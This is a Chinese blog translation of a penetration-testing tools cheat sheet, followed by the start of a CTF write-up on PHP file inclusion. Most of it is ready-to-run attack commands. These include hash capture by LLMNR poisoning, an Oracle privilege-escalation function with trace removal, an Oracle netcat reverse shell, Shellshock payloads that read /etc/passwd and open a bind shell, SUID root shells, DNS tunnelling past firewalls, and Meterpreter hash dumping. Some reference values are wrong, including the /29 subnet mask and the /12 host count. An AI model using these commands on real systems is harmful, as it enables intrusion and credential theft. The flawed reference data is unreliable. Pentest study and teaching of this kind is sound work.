利用子网的地址解析协议发现同网段的IP，MAC地址和MAC厂商 枚举和攻击网络服务 用于识别/枚举网络服务的工具。\nSAMB / SMB / Windows 域枚举 Samba枚举 SMB枚举工具 1 2 3 4 nmblookup -A target smbclient //MOUNT/share -I target -N rpcclient -U \u0026#34;\u0026#34; target enum4linux target 当然也可参考本站的 nbtscan 的速查表\nSMB 版本指纹识别 1 smbclient -L //192.168.1.100 寻找开放的SMB共享 1 nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.1.0/24 枚举SMB用户 1 nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.200-254 1 python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.XXX.XXX RID循环（RID Cycling ）\n1 ridenum.py 192.168.XXX.XXX 500 50000 dict.txt Metasploit的RID循环攻击模块\n1 use auxiliary/scanner/smb/smb_lookupsid 手动测试空会话 1 2 3 4 5 Windows: net use \\\\TARGET\\IPC$ \u0026#34;\u0026#34; /u:\u0026#34;\u0026#34; Linux: smbclient -L //192.168.99.131 NBTScan unixwiz 在Kali上安装使用：\n1 2 apt-get install nbtscan-unixwiz nbtscan-unixwiz -f 192.168.0.1-254 \u0026gt; nbtscan LLMNR / NBT-NS欺骗 从网络中窃取凭证\n使用Metasploit进行 LLMNR / NetBIOS请求 欺骗/毒化 LLMNR / NetBIOS请求：\n1 2 auxiliary/spoof/llmnr/llmnr_response auxiliary/spoof/nbns/nbns_response 抓取哈希\n1 2 auxiliary/server/capture/smb auxiliary/server/capture/http_ntlm 最后会得到NTLMv2 哈希，可以使用john或者hashcat破解。\nResponder.py 你也可以选择使用 responder\n1 2 git clone https://github.com/SpiderLabs/Responder.git python Responder.py -i local-ip -I eth0 注：整个渗透测试过程可以一直允许Responder.py\nSNMP枚举工具 SNMP枚举工具有很多。\n美化SNMP输出结果使易于阅读。\n1 2 apt-get install snmp-mibs-downloader download-mibs echo \u0026#34;\u0026#34; \u0026gt; /etc/snmp/snmp.conf 命令 解释 snmpcheck -t 192.168.1.X -c public` snmpwalk -c public -v1 192.168.1.X 1 grep hrSWRunName SNMPv3枚举工具 使用nmap识别SNMPv3服务器\n1 nmap -sV -p 161 --script=snmp-info TARGET-SUBNET Rory McCune 的脚本可以帮助自动化枚举SNMPv3的用户名枚举。\n1 2 apt-get install snmp snmp-mibs-downloader wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb 注意：下面的路径是Kali上Metasploit的SNMP v1和v2的攻击字典，更新的字典可以参考Daniel Miessler 在GitHub上的安全列表 。\n1 /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt 远程服务枚举 这已是老生常谈，但为了本文内容的全面还是包含如下。\nnmap -A 会进行下面列举的所有远程服务的枚举，所以这里只是顺便提及。\nRSH 枚举 RSH运行命令 1 rsh \u0026lt;target\u0026gt; \u0026lt;command\u0026gt; MetasploitRSH 登陆扫描 1 auxiliary/scanner/rservices/rsh_login 使用rusers显示已登陆用户 1 rusers -al 192.168.2.1 使用rlogin扫描整个子网 1 2 rlogin -l \u0026lt;user\u0026gt; \u0026lt;target\u0026gt; e.g rlogin -l root TARGET-SUBNET/24 使用finger枚举 1 2 finger @TARGET-IP finger batman@TARGET-IP 利用Solaris的bug显示所有已登录用户 1 2 3 4 5 6 finger 0@host SunOS: RPC services allow user enum: $ rusers # users logged onto LAN finger \u0026#39;a b c d e f g h\u0026#39;@sunhost rwho 使用nmap识别运行rwhod服务（513端口，UDP协议）的机器。\nTLS\u0026amp;SSL 测试 testssl.sh 测试单一主机并将结果输出的HTML文件：\n1 ./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U TARGET-HOST | aha \u0026gt; OUTPUT-FILE.html 漏洞评估 在Kali Rolling上安装OpenVAS 8\n1 2 3 4 apt-get update apt-get dist-upgrade -y apt-get install openvas openvas-setup 确认openvas 正在运行：\n1 netstat -tulpn 通过https://127.0.0.1:9392 登陆openvas，密码是在安装时设置好的。\n数据库渗透测试 攻击暴露在互联网上的数据库。\nOracle 安装 oscanner：\n1 apt-get install oscanner 运行 oscanner：\n1 oscanner -s 192.168.1.200 -P 1521 Oracle TNS版本指纹识别 安装 tnscmd10g ：\n1 apt-get install tnscmd10g 识别：\n1 2 tnscmd10g version -h TARGET nmap --script=oracle-tns-version 爆破Oracle账户 验证默认账户\n1 2 nmap --script=oracle-sid-brute nmap --script=oracle-brute 对Oracle TNS 运行nmap脚本：\n1 nmap -p 1521 -A TARGET Oracle权限提升 利用条件：\nOracle必须暴露在互联网上 使用默认账户，如scott 简明流程：\n创建函数 创建表 SYS.DUAL 的索引 刚刚建立的索引执行了SCOTT.DBA_X 函数 函数是被SYS用户执行的，因为表 SYS.DUAL 属于SYS用户 创建具有DBA权限的账户 下面的展示使用SCOTT用户，但其他默认的Oracle用户也是可以的。\n使用NMAP NSE脚本验证oracle数据库中的默认账户： 1 2 nmap --script=oracle-sid-brute nmap --script=oracle-brute 使用脆弱账号登陆（假设你发现了一个）。\n确认一个oracle用户的权限级别 1 2 3 4 5 6 7 8 9 10 SQL\u0026gt; select * from session_privs; SQL\u0026gt; CREATE OR REPLACE FUNCTION GETDBA(FOO varchar) return varchar deterministic authid curren_user is pragma autonomous_transaction; begin execute immediate \u0026#39;grant dba to user1 identified by pass1\u0026#39;; commit; return \u0026#39;FOO\u0026#39;; end; Oracle权限提升和访问DBA 运行netcat，netcat -nvlp 443 。\n1 SQL\u0026gt; create index exploit_1337 on SYS.DUAL(SCOTT.GETDBA(\u0026#39;BAR\u0026#39;)); 运行查询语句 1 SQL\u0026gt; Select * from session_privs; 这时你应该拥有一个DBA用户，可以重新运行上面的命令来验证自己是否拥有DBA特权。\n移除利用痕迹： 1 drop index exploit_1337; 获取Oracle反弹shell： 1 2 3 4 5 6 7 8 9 10 begin dbms_scheduler.create_job( job_name =\u0026gt; \u0026#39;MEH1337\u0026#39;,job_type =\u0026gt; \u0026#39;EXECUTABLE\u0026#39;,job_action =\u0026gt; \u0026#39;/bin/nc\u0026#39;,number_of_arguments =\u0026gt; 4,start_date =\u0026gt; SYSTIMESTAMP,enabled =\u0026gt; FALSE,auto_drop =\u0026gt; TRUE); dbms_scheduler.set_job_argument_value(\u0026#39;rev_shell\u0026#39;, 1, \u0026#39;TARGET-IP\u0026#39;); dbms_scheduler.set_job_argument_value(\u0026#39;rev_shell\u0026#39;, 2, \u0026#39;443\u0026#39;); dbms_scheduler.set_job_argument_value(\u0026#39;rev_shell\u0026#39;, 3, \u0026#39;-e\u0026#39;); dbms_scheduler.set_job_argument_value(\u0026#39;rev_shell\u0026#39;, 4, \u0026#39;/bin/bash\u0026#39;); dbms_scheduler.enable(\u0026#39;rev_shell\u0026#39;); end; MSSQL 枚举/发现\nNmap\n1 nmap -sU --script=ms-sql-info 192.168.1.108 192.168.1.156 Metasploit\n1 msf \u0026gt; use auxiliary/scanner/mssql/mssql_ping 爆破 MSSQL登陆 1 msf \u0026gt; use auxiliary/admin/mssql/mssql_enum Metasploit MSSQL Shell 1 2 msf \u0026gt; use exploit/windows/mssql/mssql_payload msf exploit(mssql_payload) \u0026gt; set PAYLOAD windows/meterpreter/reverse_tcp 网络 Plink.exe 隧道 PuTTY Link 隧道\n转发运程端口到本地地址：\n1 plink.exe -P 22 -l root -pw \u0026#34;1337\u0026#34; -R 445:127.0.0.1:445 REMOTE-IP 跳板（Pivoting） SSH 跳板（ssh Pivoting） 1 ssh -D 127.0.0.1:1010 -p 22 user@pivot-target-ip 需在 /etc/proxychains.conf 添加sock4 127.0.0.1 1010\n利用SSH跳板跨越网络\n1 ssh -D 127.0.0.1:1010 -p 22 user1@ip-address-1 需在 /etc/proxychains.conf 添加sock4 127.0.0.1 1010\n1 proxychains ssh -D 127.0.0.1:1011 -p 22 user1@ip-address-2 在 /etc/proxychains.conf 添加sock4 127.0.0.1 1011\nMeterpreter Pivoting TTL 指纹识别 操作系统 TTL 值 Windows 128 Linux 64 Solaris 255 Cisco / Network 255 IPv4 速查 各类IP的地址范围 类别 IP 地址范围 A类 0.0.0.0 - 127.255.255.255 B类 128.0.0.0 - 191.255.255.255 C类 192.0.0.0 - 223.255.255.255 D类 224.0.0.0 - 239.255.255.255 E类 240.0.0.0 - 255.255.255.255 IPv4私有地址 类别 范围 A类私有地址 10.0.0.0 - 10.255.255.255 B类私有地址 172.16.0.0 - 172.31.255.255 C类私有地址 192.168.0.0 - 192.168.255.255 127.0.0.0 - 127.255.255.255 IPv4子网速查表 和渗透测试关系不太大，但确实很有用。\nCIDR 十进制掩码 主机数量 /31 255.255.255.254 1 Host /30 255.255.255.252 2 Hosts /29 255.255.255.249 6 Hosts /28 255.255.255.240 14 Hosts /27 255.255.255.224 30 Hosts /26 255.255.255.192 62 Hosts /25 255.255.255.128 126 Hosts /24 255.255.255.0 254 Hosts /23 255.255.254.0 512 Host /22 255.255.252.0 1022 Hosts /21 255.255.248.0 2046 Hosts /20 255.255.240.0 4094 Hosts /19 255.255.224.0 8190 Hosts /18 255.255.192.0 16382 Hosts /17 255.255.128.0 32766 Hosts /16 255.255.0.0 65534 Hosts /15 255.254.0.0 131070 Hosts /14 255.252.0.0 262142 Hosts /13 255.248.0.0 524286 Hosts /12 255.240.0.0 1048674 Hosts /11 255.224.0.0 2097150 Hosts /10 255.192.0.0 4194302 Hosts /9 255.128.0.0 8388606 Hosts /8 255.0.0.0 16777214 Hosts VLAN hopping（跳跃攻击） 使用nccgroup 的脚本简化攻击过程\n1 2 3 git clone https://github.com/nccgroup/vlan-hopping.git chmod 700 frogger.sh ./frogger.sh VPN测试工具 识别VPN服务器\n1 ./udp-protocol-scanner.pl -p ike TARGET(s) 扫描VPN服务器网段：\n1 ./udp-protocol-scanner.pl -p ike -f ip.txt IKEForce 使用IKEForce枚举或对 VPN 服务器进行字典攻击.\n安装:\n1 2 pip install pyip git clone https://github.com/SpiderLabs/ikeforce.git 使用IKEForce对IKE VPN 进行枚举：\n1 ./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic 使用 IKEForce 爆破 IKE VPN:\n1 ./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1 1 2 3 4 ike-scan ike-scan TARGET-IP ike-scan -A TARGET-IP ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key IKE 激进模式 PSK 破解 验证VPN服务器 使用 IKEForce 枚举来获得组ID 使用 ike-scan 从IKE 终端抓取 PSK 哈希 使用 psk-crack 破解哈希 Step 1: 验证IKE服务器 1 ./udp-protocol-scanner.pl -p ike SUBNET/24 Step 2:使用IKEForce枚举组名 1 ./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic Step 3: 使用ike-scan抓取PSK哈希 1 ike-scan –M –A –n example_group -P hash-file.txt TARGET-IP Step 4: 使用psk-crack 破解PSK 哈希 1 psk-crack hash-file.txt 高级psk-crack 选项:\n1 2 3 4 pskcrack psk-crack -b 5 TARGET-IPkey psk-crack -b 5 --charset=\u0026#34;01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\u0026#34; 192-168-207-134key psk-crack -d /path/to/dictionary-file TARGET-IP-key PPTP Hacking 验证PPTP服务 ，它以TCP协议在1723端口监听\nNMAP PPTP 指纹识别: 1 nmap –Pn -sV -p 1723 TARGET(S) PPTP字典攻击 1 thc-pptp-bruter -u hansolo -W -w /usr/share/wordlists/nmap.lst DNS 隧道 通过DNS传送数据来绕过防火墙。dns2cat支持和目标主机间 的上传和下载文件（数据或程序）操作。\n攻击机器： 安装:\n1 2 3 4 5 6 apt-get update apt-get -y install ruby-dev git make g++ gem install bundler git clone https://github.com/iagox86/dnscat2.git cd dnscat2/server bundle install 运行dnscat2:\n1 2 3 ruby ./dnscat2.rb dnscat2\u0026gt; New session established: 1422 dnscat2\u0026gt; session -i 1422 目标机器:\nhttps://downloads.skullsecurity.org/dnscat2/\nhttps://github.com/lukebaggett/dnscat2-powershell/\n1 dnscat --host \u0026lt;dnscat server_ip\u0026gt; BOF / Exploit Exploit 搜索 寻找枚举主机/服务的exp\n命令 解释 `searchsploit windows 2003 grep -i local` site:exploit-db.com exploit kernel \u0026lt;= 3 使用Google搜索exploit-db.com grep -R \u0026quot;W7\u0026quot; /usr/share/metasploit-framework/modules/exploit/windows/* 用grep搜索metasploit的模块——因为msf的搜索有点差劲。 搜索EXP 安装exploit-db的本地备份:\n1 2 3 4 searchsploit –u searchsploit apache 2.2 searchsploit \u0026#34;Linux Kernel\u0026#34; searchsploit linux 2.6 | grep -i ubuntu | grep local 在Kali上编译WIndows的exp 1 2 3 4 5 6 7 8 wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download wine mingw-get-setup.exe select mingw32-base cd /root/.wine/drive_c/windows wget http://gojhonny.com/misc/mingw_bin.zip \u0026amp;\u0026amp; unzip mingw_bin.zip cd /root/.wine/drive_c/MinGW/bin wine gcc -o ability.exe /tmp/exploit.c -lwsock32 wine ability.exe 交叉编译Exploits 1 2 gcc -m32 -o output32 hello.c (32 bit) gcc -m64 -o output hello.c (64 bit) 利用通用漏洞 利用Shellshock漏洞 一个用来寻找和利用Shellshock漏洞的攻击\n1 git clone https://github.com/nccgroup/shocker 1 ./shocker.py -H TARGET --command \u0026#34;/bin/cat /etc/passwd\u0026#34; -c /cgi-bin/status --verbose cat file (查看文件内容) 1 echo -e \u0026#34;HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () { :;}; echo \\$(\u0026lt;/etc/passwd)\\r\\nHost: vulnerable\\r\\nConnection: close\\r\\n\\r\\n\u0026#34; | nc TARGET 80 Shell Shock 运行bind shell 1 echo -e \u0026#34;HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\\r\\nHost: vulnerable\\r\\nConnection: close\\r\\n\\r\\n\u0026#34; | nc TARGET 80 Shell Shock 反弹shell 1 nc -l -p 443 简单的本地Web服务器 使用Python命令运行本地Web服务，在接受反向shell和攻击目标机器是很方便。\n命令 解释 python -m SimpleHTTPServer 80 运行一个基本的 http 服务,接受反弹shell等情况下很棒 python3 -m http.server 运行一个基本的 Python3 http 服务 ruby -rwebrick -e \u0026quot;WEBrick::HTTPServer.new(:Port =\u0026gt; 80, :DocumentRoot =\u0026gt; Dir.pwd).start\u0026quot; 运行一个基本的ruby http 服务 php -S 0.0.0.0:80 运行一个基本的 PHP http 服务 挂载文件共享 怎样挂载 NFS / CIFS以进行 Windows 和Linux 的文件共享。\n命令 解释 mount 192.168.1.1:/vol/share /mnt/nfs 挂载NFS共享到 /mnt/nfs mount -t cifs -o username=user,password=pass,domain=blah //192.168.1.X/share-name /mnt/cifs 挂载Windows CIFS / SMB 共享到 Linux 的 /mnt/cifs 。如果不直接在命令里带密码，可以在询问后输入，这样就不会在bash命令历史里存储明文密码 net use Z: \\\\win-server\\share password /user:domain\\janedoe /savecred /p:no 使用命令行在Windows间挂载共享文件 apt-get install smb4k -y 在Kali上安装smb4k，方便从Linux的GUI查看SMB共享 HTTP / HTTPS Web服务枚举 命令 解释 nikto -h 192.168.1.1 对目标使用 nikto 进行扫描 dirbuster 使用GUI配置，命令行不好使 数据包侦测 命令 解释 tcpdump tcp port 80 -w output.pcap -i eth0 将网卡eth0的80端口的流量导出到output.pcap 用户名枚举 一些用来枚举目标系统用户名的手法。\nSMB 用户枚举 命令 解释 python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.XXX.XXX 枚举SMB用户 ridenum.py 192.168.XXX.XXX 500 50000 dict.txt 利用RID cycle枚举SMB用户 SNMP 用户枚举 COMMAND DESCRIPTION `snmpwalk public -v1 192.168.X.XXX 1 grep 77.1.2.25 python /usr/share/doc/python-impacket-doc/examples/samrdump.py SNMP 192.168.X.XXX 枚举 SNMP 用户 nmap -sT -p 161 192.168.X.XXX/254 -oG snmp_results.txt (then grep) 使用nmap搜索SNMP服务器，然后用grep过滤输出 密码 字典 命令 解释 /usr/share/wordlists Kali 的字典存放路径 爆破服务 使用Hydra 爆破FTP 命令 解释 hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX ftp -V 使用Hydra 爆破FTP 使用Hydra 爆破POP3 COMMAND DESCRIPTION hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX pop3 -V 使用Hydra 爆破POP3 使用Hydra 爆破SMTP COMMAND DESCRIPTION hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V 使用Hydra 爆破SMTP 使用 -t 限制并发连接数，如 -t 15\n密码破解 渗透测试中用于密码破解的工具。\nJohn The Ripper - JTR 命令 解释 john --wordlist=/usr/share/wordlists/rockyou.txt hashes JTR 破解密码 john --format=descrypt --wordlist /usr/share/wordlists/rockyou.txt hash.txt JTR 使用字典爆破解密 john --format=descrypt hash --show JTR 爆破解密 Windows 渗透测试命令 See Windows Penetration Testing Commands.【待原文补充】\nLinux 渗透测试命令 参考本站的Linux 命令速查表 ，该表提供了很多有用的命令。\n编译EXP Some notes on compiling exploits.【待原文补充】\n判断C代码适用于Windows平台还是Linux 通过#include 的文件来判定\n命令 解释 process.h, string.h, winbase.h, windows.h, winsock2.h Windows平台代码 arpa/inet.h, fcntl.h, netdb.h, netinet/in.h, sys/sockt.h, sys/types.h, unistd.h Linux平台代码 使用GCC编译Exploit 命令 解释 gcc -o exploit exploit.c GCC基本用法 在64位的Kali上用GCC编译32位的EXP 很方便地在64位的攻击机器上交叉编译32位的二进制文件。\n命令 解释 gcc -m32 exploit.c -o exploit 在64位的Linux上交叉编译32位的二进制文件 在 Linux上编译可运行于Windows的exe文件 COMMAND DESCRIPTION i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe 在 Linux上生成Windows的exe SUID 二进制 通常具有SUID的 C二进制文件要求以超级用户登陆shell，您可以按需更新UID / GID和shell。\n下面是一些可用的shell：\n运行 /bin/bash的SUID C Shell 1 2 3 4 int main(void){ setresuid(0, 0, 0); system(\u0026#34;/bin/bash\u0026#34;); } 运行 /bin/sh的SUID C Shell 1 2 3 4 int main(void){ setresuid(0, 0, 0); system(\u0026#34;/bin/sh\u0026#34;); } 构建 SUID Shell 二进制 1 gcc -o suid suid.c 32位\n1 gcc -m32 -o suid suid.c 反向Shells 参考 反向 Shell 速查表 。\nTTY Shells Tips / Tricks to spawn a TTY shell from a limited shell in Linux, useful for running commands like su from reverse shells.\n一些模拟出TTY终端窗口以突破shell限制的技巧，便于从反向shell上执行类似 su 的特殊命令。\n用Python模拟 TTY Shell的技巧 1 python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; 1 echo os.system(\u0026#39;/bin/bash\u0026#39;) 用sh模拟交互式shell 1 /bin/sh -i 用Perl模拟 TTY Shell 1 2 exec \u0026#34;/bin/sh\u0026#34;; perl —e \u0026#39;exec \u0026#34;/bin/sh\u0026#34;;\u0026#39; 用Ruby模拟 TTY Shell 1 exec \u0026#34;/bin/sh\u0026#34; 用Lua 模拟TTY Shell 1 os.execute(\u0026#39;/bin/sh\u0026#39;) 从Vi模拟TTY Shell 1 :!bash 用NMAP模拟TTY Shell 1 !sh Metasploit 速查表 这是一个metasploit方便的速查手册。关于跳板技术可参看 Meterpreter Pivoting 。\nMeterpreter Payloads Windows 反向meterpreter payload 命令 解释 set payload windows/meterpreter/reverse_tcp Windows 反向tcp payload Windows VNC Meterpreter payload 命令 解释 set payload windows/vncinject/reverse_tcp``set ViewOnly false Meterpreter Windows VNC Payload Linux 反向Meterpreter payload 命令 解释 set payload linux/meterpreter/reverse_tcp Meterpreter Linux 反向Payload Meterpreter速查表 有用的meterpreter 命令。\n命令 解释 upload file c:\\\\windows Meterpreter上传文件到 Windows 目标 download c:\\\\windows\\\\repair\\\\sam /tmp Meterpreter 从 Windows 目标下载文件 execute -f c:\\\\windows\\temp\\exploit.exe Meterpreter 在目标机器上执行.exe文件——用来执行上传的exp很方便 execute -f cmd -c 创建新的cmd shell通道 ps Meterpreter显示进程 shell Meterpreter获取目标shell getsystem Meterpreter尝试提权 hashdump Meterpreter尝试导出目标机器上的哈希 portfwd add –l 3389 –p 3389 –r target Meterpreter端口转发 portfwd delete –l 3389 –p 3389 –r target Meterpreter删除端口转发 常用Metasploit 模块 最常用的metasploit 模块。\n远程Windows Metasploit 模块(exploits) 命令 解释 use exploit/windows/smb/ms08_067_netapi MS08_067 Windows 2k, XP, 2003 远程攻击 use exploit/windows/dcerpc/ms06_040_netapi MS08_040 Windows NT, 2k, XP, 2003 远程攻击 use exploit/windows/smb/ms09_050_smb2_negotiate_func_index MS09_050 Windows Vista SP1/SP2 和Server 2008 (x86) 远程攻击 本地Windows Metasploit 模块(exploits) 命令 解释 use exploit/windows/local/bypassuac 绕过 Windows 7 上的UAC 辅助Metasploit 模块 命令 解释 use auxiliary/scanner/http/dir_scanner Metasploit HTTP 目录扫描 use auxiliary/scanner/http/jboss_vulnscan Metasploit JBOSS 漏扫 use auxiliary/scanner/mssql/mssql_login Metasploit MSSQL 认证扫描 use auxiliary/scanner/mysql/mysql_version Metasploit MSSQL 版本扫描 use auxiliary/scanner/oracle/oracle_login Metasploit Oracle 登陆模块 Metasploit Powershell 模块 命令 解释 use exploit/multi/script/web_delivery Metasploit powershell payload c传送模块 post/windows/manage/powershell/exec_powershell Metasploit通过会话上传和执行 powershell脚本 use exploit/multi/http/jboss_maindeployer Metasploit JBOSS 部署 use exploit/windows/mssql/mssql_payload Metasploit MSSQL payload Windows 后渗透Metasploit 模块 Windows Metasploit 提权模块。\n命令 解释 run post/windows/gather/win_privs Metasploit 显示当前用户权限 use post/windows/gather/credentials/gpp Metasploit 提取 GPP 保存的密码 load mimikatz -\u0026gt; wdigest Metasplit 加载 Mimikatz run post/windows/gather/local_admin_search_enum 检查当前用户是否对域内其他机器有管理员权限 run post/windows/gather/smart_hashdump 自动化导出sam 文件，尝试提权等。 ASCII表速查 对Web应用渗透测试很有用，或者你被困在火星而需要和NASA通信。（梗自《火星救援》）\nASCII 字符 x00 Null Byte 空字节 x08 BS 退格 x09 TAB 水平制表符 x0a LF 换行 x0d CR 回车 x1b ESC x20 SPC 空格 x21 ! x22 \u0026quot; x23 # x24 $ x25 % x26 \u0026amp; x27 ` x28 ( x29 ) x2a * x2b + x2c , x2d - x2e . x2f / x30 0 x31 1 x32 2 x33 3 x34 4 x35 5 x36 6 x37 7 x38 8 x39 9 x3a : x3b ; x3c \u0026lt; x3d = x3e \u0026gt; x3f ? x40 @ x41 A x42 B x43 C x44 D x45 E x46 F x47 G x48 H x49 I x4a J x4b K x4c L x4d M x4e N x4f O x50 P x51 Q x52 R x53 S x54 T x55 U x56 V x57 W x58 X x59 Y x5a Z x5b [ x5c \\ x5d ] x5e ^ x5f _ x60 ` x61 a x62 b x63 c x64 d x65 e x66 f x67 g x68 h x69 i x6a j x6b k x6c l x6d m x6e n x6f o x70 p x71 q x72 r x73 s x74 t x75 u x76 v x77 w x78 x x79 y x7a z CISCO IOS(网际操作系统) 命令 收集一些有用的Cisco IOS 命令.\n命令 解释 enable 进入使能模式 conf t 配置终端 (config)# interface fa0/0 配置 FastEthernet 0/0 (config-if)# ip addr 0.0.0.0 255.255.255.255 添加IP到 fa0/0 (config-if)# line vty 0 4 配置 vty line (config-line)# login 登陆 (config-line)# password YOUR-PASSWORD 设置 telnet 密码 # show running-config 显示内存中的运行配置 # show startup-config 显示启动配置 # show version 显示cisco IOS 版本 # show session 显示已打开的会话 # show ip interface 显示网卡 # show interface e0 显示网络接口细节 # show ip route 显示路由 # show access-lists 显示access lists # dir file systems 列出可用文件 # dir all-filesystems 显示文件信息 # dir /all 显示已删除文件 # terminal length 0 取消终端输出长度限制 # copy running-config tftp 复制运行配置到tftp 服务器 # copy running-config startup-config 复制启动配置到运行配置 密码学 哈希长度 哈希 长度 MD5 16 Bytes SHA-1 20 Bytes SHA-256 32 Bytes SHA-512 64 Bytes 哈希例子 可以直接使用 hash-identifier 命令判断哈希类型，但这里还是举些例子。\n哈希 例子 MD5 Hash Example 8743b52063cd84097a65d1633f5c74f5 MD5 $PASS:$SALT Example 01dfae6e5d4d90d9892622325959afbe:7050461 MD5 $SALT:$PASS f0fda58630310a6dd91a7d8f0a4ceda2:4225637426 SHA1 Hash Example b89eaac7e61417341b710b727768294d0e6a277b SHA1 $PASS:$SALT 2fc5a684737ce1bf7b3b239df432416e0dd07357:2014 SHA1 $SALT:$PASS cac35ec206d868b7d7cb0b55f31d9425b075082b:5363620024 SHA-256 127e6fbfe24a750e72930c220a8e138275656b8e5d8f48a98c3c92df2caba935 SHA-256 $PASS:$SALT c73d08de890479518ed60cf670d17faa26a4a71f995c1dcc978165399401a6c4 SHA-256 $SALT:$PASS eb368a2dfd38b405f014118c7d9747fcc97f4f0ee75c05963cd9da6ee65ef498:560407001617 SHA-512 82a9dda829eb7f8ffe9fbe49e45d47d2dad9664fbb7adf72492e3c81ebd3e29134d9bc12212bf83c6840f10e8246b9db54a4859b7ccd0123d86e5872c1e5082f SHA-512 $PASS:$SALT e5c3ede3e49fb86592fb03f471c35ba13e8d89b8ab65142c9a8fdafb635fa2223c24e5558fd9313e8995019dcbec1fb584146b7bb12685c7765fc8c0d51379fd SHA-512 $SALT:$PASS 976b451818634a1e2acba682da3fd6efa72adf8a7a08d7939550c244b237c72c7d42367544e826c0c83fe5c02f97c0373b6b1386cc794bf0d21d2df01bb9c08a NTLM Hash Example b4b9b02e6f09a9bd760f388b67351e2b SQLMap例子 小型 SQLMap 速查表：\n命令 解释 sqlmap -u http://meh.com --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3 自动化sqlmap扫描 sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords --file-read=\u0026quot;/var/www/blah.php\u0026quot; 指定目标的sqlmap scan sqlmap -u \u0026quot;http://meh.com/meh.php?id=1\u0026quot; --dbms=mysql --tech=U --random-agent --dump 使用联合查询技术扫描mysql后端的基于报错的注入 ，使用随机UA，导出数据库 sqlmap -o -u \u0026quot;http://meh.com/form/\u0026quot; --forms 检测可能存在注入点表单 sqlmap -o -u \u0026quot;http://meh/vuln-form\u0026quot; --forms -D database-name -T users --dump 导出指定数据库的user表并尝试破解哈希。 ","permalink":"https://ret2neo.cn/post/180727penetrationtool/","summary":"渗透测试工具备忘录 本文翻译自 Penetration Testing Tools Cheat Sheet ，首发先知社区 ，转载请注明链接。\n简介 渗透测试工具备忘录记录渗透测试时常用的命令，更深入的信息推荐参考特定工具的帮助文档或 本站 其他备忘录。\n本目录关注网络底层相关的渗透测试，除了少量sqlmap的命令和一些Web服务枚举外，基本不包含Web应用渗透测试的内容。关于Web应用测试，建议参考《黑客攻防技术宝典》，这本书不管是用作专门学习还是参考手册都是很棒的。\n文中缺漏之处欢迎 推特 私戳。\n更新日志： 17/02/2017 ：更新文章，增加VPN，DNS隧道，VLAN hopping（跳跃攻击） 等内容。\n开始前 网络配置 设置IP 地址 1 ifconfig eth0 xxx.xxx.xxx.xxx/24 子网划分 1 2 ipcalc xxx.xxx.xxx.xxx/24 ipcalc xxx.xxx.xxx.xxx 255.255.255.0 公开来源情报 被动信息收集 DNS WHOIS 枚举 1 whois domain-name-here.com 查询DNS IP 1 dig a domain-name-here.com @nameserver 查询MX记录 1 dig mx domain-name-here.com @nameserver 用DIG 查询域传送 1 dig axfr domain-name-here.com @nameserver DNS 域传送 命令 解释 nslookup -\u0026gt; set type=any -\u0026gt; ls -d blah.","title":"【译】渗透测试工具备忘录"},{"content":"本文首发 先知社区 ，转载请注明链接。\n本题考察PHP源码审计。主要有两个缺陷：使用ECB模式进行AES加密导致的CPA（选择明文攻击）和 文件包含。有两处可以向文件写入内容以供包含，但均被过滤，最终通过以未被过滤的Cookie为跳板连接两处文件包含来写入Shell。文末还介绍了一种深入利用一处文件包含getshell的解法。\n概览 打开 http://178.128.87.16 是一个登陆页面，注册账户后有四个页面，HOME 是欢迎页，CHARACTER 页可以和宠物角色互动，但账户刚注册完是没有宠物的，需要获取ADMIN权限后自行添加， SETTING 页可以修改用户名和选择头像，GAME 页是一个Flash小游戏，和本题无关。\n题目提供了源码下载，可以从 这里 或 备用地址 下载。\n文件包含 index.php index.php 文件中有如下语句，显然存在文件包含。\n1 2 3 4 if(isset($_GET[\u0026#39;page\u0026#39;]) \u0026amp;\u0026amp; !empty($_GET[\u0026#39;page\u0026#39;])) { include($_GET[\u0026#39;page\u0026#39;]); } 但所有 GET 和POST 提交的参数都会被删除掉敏感字符串，其中 // 、(.+) 和 `` 是比较值得注意的。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 function bad_words($value) { //My A.I TsuGo show me that when player using these words below they feel angry, so i decide to censor them. //Maybe some word is false positive but pls accept it, for a no-cancer gaming environment! $too_bad=\u0026#34;/(fuck|bakayaro|ditme|bitch|caonima|idiot|bobo|tanga|pin|gago|tangina|\\/\\/|damn|noob|pro|nishigou|stupid|ass|\\(.+\\)|`.+`|vcl|cyka|dcm)/is\u0026#34;; $value = preg_replace($too_bad, str_repeat(\u0026#34;*\u0026#34;,3) ,$value); return $value; } foreach($_GET as $key=\u0026gt;$value) { if (is_array($value)){mapl_die();} $value=bad_words($value); $_GET[$key]=$value; } foreach($_POST as $key2=\u0026gt;$value2) { if (is_array($value2)){mapl_die();} $value2=bad_words($value2); $_POST[$key2]=$value2; } PHP使用PHPSESSID cookie值 存储会话标识，一般在/var/lib/php/sessions/sess_\u0026lt;PHPSESSID\u0026gt; 文件里写有一些有特定意义的字符串，其中\u0026lt;PHPSESSID\u0026gt; 